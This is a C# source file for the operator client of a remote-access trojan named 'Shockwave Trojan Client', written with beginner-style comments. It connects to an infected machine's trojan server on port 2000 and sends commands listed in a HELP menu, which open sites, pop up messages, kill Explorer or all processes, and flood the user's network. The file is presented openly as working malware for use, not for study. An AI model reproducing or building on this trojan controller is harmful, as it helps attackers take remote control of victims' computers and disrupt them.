using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Text;

namespace Client
{
    class Program
    {
        public static bool IsConnected;
        public static NetworkStream Writer;
        static void Main(string[] args)
        {
             //This just makes the program look cooler;-) 
	      Console.ForegroundColor = ConsoleColor.Green; 
          Console.Title = "Shockwave Trojan Client - Offline";
 
             //This is the TcpClient; we will use this for the connection.

          TcpClient Connector = new TcpClient();

	      //If you can't connect, it takes you back here to try again.
 
          GetConnection:
 
	      //Get the user to enter the IP of the server.
	 
	      Console.WriteLine("Enter server IP :");
 
	      string IP = Console.ReadLine();
	 
	      //Attempt to connect; use a try...catch statement to avoid crashes.
	 
	      try
	      {
	 
	          //Connect to the specified IP on port 2000 (the port the trojan server uses!)
	 
	          Connector.Connect(IP, 2000);
	 
          //So the program continues to receive commands.
 
	          IsConnected = true;
	 
	          //Changes the console title to "Shockwave Trojan Client - Online"
	 
	          Console.Title = "Shockwave Trojan Client - Online";
	 
	          //Make Writer the stream coming from / going to Connector.
	 
	          Writer = Connector.GetStream();
	 
              //We connected!

	      }
	 
	      catch
	 
	      {
 
	          //We couldn't connect :-(
	 
              Console.WriteLine("Error connecting to target server! Press any key to try again.");
	 
	          Console.ReadKey();
	 
	          //Go back and start again!
	 
	          Console.Clear();
	 
	          goto GetConnection;
	 
	      }
	      //Let user know they connected and that if they type HELP they'll get a list of commands to use.
	      Console.WriteLine("Connection successfully established to " + IP + ".");
	 
	      Console.WriteLine("Type HELP for a list of commands.");
	 
	      //While you're connected to the server
	 
	      while (IsConnected)
	      
	      {
	 
	          Console.WriteLine("Enter command : ");
	 
	          string CMD = Console.ReadLine();
	 
	          //If they type HELP
	 
	          if (CMD == "HELP")
	          {
	 
	              Console.WriteLine("COMMANDS");
	 
	              Console.WriteLine("OPENSITE!!!---http://example.com");
	 
	              Console.WriteLine("MESSAGE!!!---message here");

                  Console.WriteLine("KILLEXPLORER!!!---");

                  Console.WriteLine("KILLALLPROCESSES!!!---");

                  Console.WriteLine("FLOODUSERNETWORK!!!---http://example.com");
	 
	          }
	              
	      //They entered a real command, so lets send it!
	 
	          else
	          
	          {
	              //Send the command using our function above
	 
	              SendCommand(CMD);
          
	          }
      
	      }
        }

        public static void SendCommand(string Command)
        {
            //Try to send
		        try
	            {
	                //Creates a packet to hold the command
	 
	                byte[] Packet = Encoding.ASCII.GetBytes(Command);
	 
	                //Send the command over the network
	 
	                Writer.Write(Packet, 0, Packet.Length);
	 
	                //Flush out any extra data that didn't send in the start.
	 
	                Writer.Flush();
	 
	            }
	 
	            catch
	 
	            {
	 
	                //Couldn't send, so we aren't connected anymore!
	 
	                IsConnected = false;
	 
	                Console.WriteLine("Disconnected from server!");
	 
	                Console.ReadKey();
	                
	                //Close the connection.
	 
	                Writer.Close();
	 
	            }
	 
        }
    }
}
